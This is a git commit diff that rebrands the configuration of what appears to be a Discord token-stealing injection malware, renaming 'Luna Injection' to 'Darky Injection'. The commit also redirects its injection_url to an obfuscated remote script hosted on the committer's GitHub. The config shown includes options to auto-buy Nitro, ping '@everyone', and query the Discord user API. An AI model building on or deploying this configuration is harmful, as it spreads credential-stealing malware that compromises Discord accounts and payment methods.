1bed1491b22bd778befca50c8cb1f5d3ebf90e6f
vishal singh <120444199+778vishalsingh@users.noreply.github.com>
2023-04-23 20:33:26 -0700

    Update injection.js

--- injection.js
+++ injection.js
@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Luna Injection', 
-  embed_icon: 'https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096'.replace(/ /g, '%20'),
+  embed_name: 'Darky Injection', 
+  embed_icon: 'https://cdn.discordapp.com/icons/1099008280161955970/cf3f224917384c822c9c44af164d7065.webp?size=128'.replace(/ /g, '%20'),
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/778vishalsingh/daddyinj/main/obfuscated-injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
